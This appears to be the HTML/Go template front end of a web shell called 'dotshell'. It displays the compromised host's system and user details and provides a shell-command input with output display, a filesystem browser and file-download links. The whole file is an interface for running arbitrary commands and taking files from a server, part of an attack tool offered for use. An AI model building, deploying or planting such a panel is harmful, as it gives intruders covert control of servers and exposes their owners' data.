<!DOCTYPE html>
<html lang="en">

<head>
    <title>dotshell</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width initial-scale=1">
    <style>
        @media only screen and (min-width: 1100px) {
            header {
                flex-direction: row;
                justify-content: space-between;
            }
        }

        @media only screen and (max-width: 1100px) {
            header {
                flex-direction: column-reverse;
                justify-content: space-between;
            }
        }

        @media only screen and (max-width: 640px) {
            pre {
                font-size: 0.5rem;
            }
        }

        body,
        input,
        textarea {
            background-color: black;
        }

        body,
        input,
        textarea,
        .path a {
            color: white;
        }

        a,
        a:hover,
        a:active {
            text-decoration: none;
        }

        textarea,
        .path input,
        .cmd input,
        .files {
            width: 100%;
        }

        img {
            max-width: 100%;
        }

        header,
        .path {
            display: flex;
        }

        input,
        .output,
        .path a {
            border: 1px solid aqua;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, Fira, Sans, "Droid Sans", "Helvetica Neue", sans-serif;
        }

        .color {
            color: aquamarine;
            font-weight: 700;
        }

        hr {
            border-color: aqua;
        }

        .cmd {
            margin-bottom: 25px;
        }

        .output {
            margin-bottom: 0;
            padding: 20px;
        }

        .path a {
            padding: 1px 5px;
        }

        textarea {
            height: 400px;
        }

        .files {
            border-collapse: collapse;
        }

        .files tr {
            border-bottom: 1px solid aqua;
        }
    </style>
</head>

<body>
    <header>
        <table>
            <tr>
                <td class="color">OS</td>
                <td>{{ .System.Os }}</td>
            </tr>
            <tr>
                <td class="color">Arch</td>
                <td>{{ .System.Arch }}</td>
            </tr>
            <tr>
                <td class="color">Hostname</td>
                <td>{{ .System.Hostname }}</td>
            </tr>
            <tr>
                <td colspan="2">
                    <hr>
                </td>
            </tr>
            <tr>
                <td class="color">User</td>
                <td>{{ .System.User.Name }} ({{ .System.User.Username }})</td>
            </tr>
            <tr>
                <td class="color">Uid</td>
                <td>{{ .System.User.Uid }}</td>
            </tr>
            <tr>
                <td class="color">Group</td>
                <td>{{ .System.User.Gid }}</td>
            </tr>
            <tr>
                <td class="color">Home</td>
                <td>{{ .System.User.HomeDir }}</td>
            </tr>
            <tr>
                <td colspan="2">
                    <hr>
                </td>
            </tr>
            <tr>
                <td class="color">Go version</td>
                <td>{{ .System.GoVersion }}</td>
            </tr>
        </table>
        <pre class="color">
 .S_sSSs      sSSs_sSSs    sdSS_SSSSSSbs    sSSs   .S    S.     sSSs  S.      S.      
.SS~YS%%b    d%%SP~YS%%b   YSSS~S%SSSSSP   d%%SP  .SS    SS.   d%%SP  SS.     SS.     
S%S   `S%b  d%S'     `S%b       S%S       d%S'    S%S    S%S  d%S'    S%S     S%S     
S%S    S%S  S%S       S%S       S%S       S%|     S%S    S%S  S%S     S%S     S%S     
S%S    S&S  S&S       S&S       S&S       S&S     S%S SSSS%S  S&S     S&S     S&S     
S&S    S&S  S&S       S&S       S&S       Y&Ss    S&S  SSS&S  S&S_Ss  S&S     S&S     
S&S    S&S  S&S       S&S       S&S       `S&&S   S&S    S&S  S&S~SP  S&S     S&S     
S&S    S&S  S&S       S&S       S&S         `S*S  S&S    S&S  S&S     S&S     S&S     
S*S    d*S  S*b       d*S       S*S          l*S  S*S    S*S  S*b     S*b     S*b     
S*S   .S*S  S*S.     .S*S       S*S         .S*P  S*S    S*S  S*S.    S*S.    S*S.    
S*S_sdSSS    SSSbs_sdSSS        S*S       sSS*S   S*S    S*S   SSSbs   SSSbs   SSSbs  
SSS~YSSY      YSSP~YSSY         S*S       YSS'    SSS    S*S    YSSP    YSSP    YSSP  
                                SP                       SP                           
                                Y                        Y

                                by DEADBLACKCLOVER
            </pre>
    </header>
    <main>
        <div class="cmd">
            {{ if ne .CmdOutput "" }}
            <pre class="output">{{ .CmdOutput }}</pre>
            {{ end }}
            <form method="get">
                <input name="cmd" autofocus placeholder="Shell command" />
            </form>
        </div>
        {{ $back := "../" }}
        {{ $path := .File.Path }}
        {{ $fileInfo := .File.FileInfo }}
        <form method="get" class="path">
            <a href="?path={{ join $path $back }}">&larr;</a>
            <input name="path" value="{{ $path }}" />
        </form>
        {{ if $fileInfo.IsDir }}
        <table class="files">
            <thead>
                <tr>
                    <td>Name</td>
                    <td>Size</td>
                    <td>Modify</td>
                    <td>Permissions</td>
                    <td>Actions</td>
                </tr>
            </thead>
            <tbody>
                {{ range $index, $file := .File.Files }}
                <tr>
                    <td>
                        <a href="?path={{ join $path $file.Name }}" class="color">{{ $file.Name }}</a>
                    </td>
                    <td>
                        {{ if $file.IsDir }}
                        DIR
                        {{ else }}
                        {{ $file.Size }}
                        {{ end }}
                    </td>
                    <td>
                        {{ $file.ModTime }}
                    </td>
                    <td>
                        {{ $file.Perm }}
                    </td>
                    <td>
                        {{ if not $file.IsDir }}
                        <a href="/download?path={{ join $path $file.Name }}" class="color">&dArr;</a>
                        {{ end }}
                    </td>
                </tr>
                {{ end }}
            </tbody>
        </table>
        {{ else }}
        {{ if $fileInfo.IsImage }}
        <img src="{{ url .File.Data }}" />
        {{ else }}
        <textarea>{{ .File.Data }}</textarea>
        {{ end }}
        {{ end }}
    </main>
</body>

</html>